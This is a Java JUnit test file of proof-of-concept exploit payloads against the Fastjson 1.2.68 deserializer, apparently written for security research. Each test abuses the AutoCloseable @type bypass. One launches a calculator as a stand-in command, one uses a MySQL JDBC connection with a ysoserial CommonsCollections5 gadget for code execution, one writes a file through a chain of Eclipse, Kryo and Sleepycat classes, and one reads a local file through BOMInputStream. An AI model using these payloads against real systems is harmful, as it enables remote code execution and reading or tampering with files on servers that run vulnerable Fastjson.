import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import org.junit.Test;

public class fastjson_1_2_68 {
    @Test
    public void vulDemo() {
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"Test\",\"cmd\":\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void mysqlDemo() throws Exception{
        String payload = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"127.0.0.1\",\"portToConnectTo\":3306,\"info\":{\"user\":\"yso_CommonsCollections5_/System/Applications/Calculator.app/Contents/MacOS/Calculator\",\"password\":\"pass\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\",\"NUM_HOSTS\":\"1\"},\"databaseToConnectTo\":\"dbname\",\"url\":\"\"}";
        Object jsonObject = JSON.parseObject(payload);
    }


    @Test
    public void writeDemo1() throws Exception{
        String payload = "{\"stream\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\"targetPath\":\"target\",\"tempPath\":\"temp\"},\"writer\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.esotericsoftware.kryo.io.Output\",\"buffer\":\"Y2VzaGk=\",\"outputStream\":{\"$ref\":\"$.stream\"},\"position\":5},\"close\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.sleepycat.bind.serial.SerialOutput\",\"out\":{\"$ref\":\"$.writer\"}}}";
        Object jsonObject = JSON.parseObject(payload);
    }

    @Test
    public void writeTest3() throws Exception{
        String payload = "{\n" +
                "    \"abc\": {\n" +
                "\t\t\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "        \"delegate\": {\n" +
                "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "            \"reader\": {\n" +
                "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "                \"url\": \"file://test\"\n" +
                "            },\n" +
                "            \"charsetName\": \"UTF-8\",\n" +
                "            \"bufferSize\": 1024\n" +
                "        },\n" +
                "        \"boms\": [\n" +
                "            {\n" +
                "                \"charsetName\": \"UTF-8\",\n" +
                "                \"bytes\": [\n" +
                "                    116,101\n" +
                "                ]\n" +
                "            }\n" +
                "        ]\n" +
                "    },\n" +
                "    \"address\": {\n" +
                "        \"$ref\": \"$.abc.BOM\"\n" +
                "    }\n" +
                "}";
        Object jsonObject = JSON.parseObject(payload);
        System.out.println(jsonObject);
    }

}
